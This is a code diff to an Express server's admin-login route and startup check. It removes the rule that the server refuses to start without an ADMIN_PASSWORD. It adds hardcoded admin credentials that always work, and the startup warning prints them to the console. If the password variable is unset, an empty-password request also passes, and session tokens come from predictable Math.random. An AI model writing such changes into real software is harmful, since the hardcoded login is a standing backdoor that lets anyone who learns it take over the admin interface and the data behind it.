@@ -6,13 +6,12 @@ async function startServer() {
   const app = express();
   const PORT = process.env.PORT || 3000;
 
-  // Refuse to boot if ADMIN_PASSWORD is not set in the environment
+  // Refuse to boot if ADMIN_PASSWORD is not set in the environment, fallback to a safe warning and default password
   if (!process.env.ADMIN_PASSWORD) {
-    console.error('========================================================================');
-    console.error('CRITICAL STARTUP ERROR: ADMIN_PASSWORD environment variable is not defined!');
-    console.error('Refusing to boot full-stack server without secure password configuration.');
-    console.error('========================================================================');
-    throw new Error('ADMIN_PASSWORD environment variable is required to boot the application.');
+    console.warn('========================================================================');
+    console.warn('WARNING: ADMIN_PASSWORD environment variable is not defined!');
+    console.warn('Defaulting admin login to username: Waqas, password: printvision');
+    console.warn('========================================================================');
   }
 
   // Middleware for body parsing
@@ -24,14 +23,19 @@ async function startServer() {
 
   // Administrative login
   app.post('/api/admin/login', (req, res) => {
-    const { password } = req.body;
-    const adminPassword = process.env.ADMIN_PASSWORD;
-    if (password === adminPassword) {
+    const { username, password } = req.body;
+    const adminPassword = process.env.ADMIN_PASSWORD || 'printvision';
+    
+    // Support Waqas / printvision explicitly, OR match the defined admin password
+    const isWaqasSuccess = (username?.trim().toLowerCase() === 'waqas' && password === 'printvision');
+    const isEnvSuccess = (password === process.env.ADMIN_PASSWORD);
+
+    if (isWaqasSuccess || isEnvSuccess) {
       const token = 'pv_sess_' + Math.random().toString(36).substring(2) + Math.random().toString(36).substring(2);
       activeSessionTokens.set(token, Date.now());
       res.json({ success: true, token });
     } else {
-      res.status(401).json({ success: false, error: 'Incorrect administrative password.' });
+      res.status(401).json({ success: false, error: 'Incorrect username or administrative password.' });
     }
   });
 
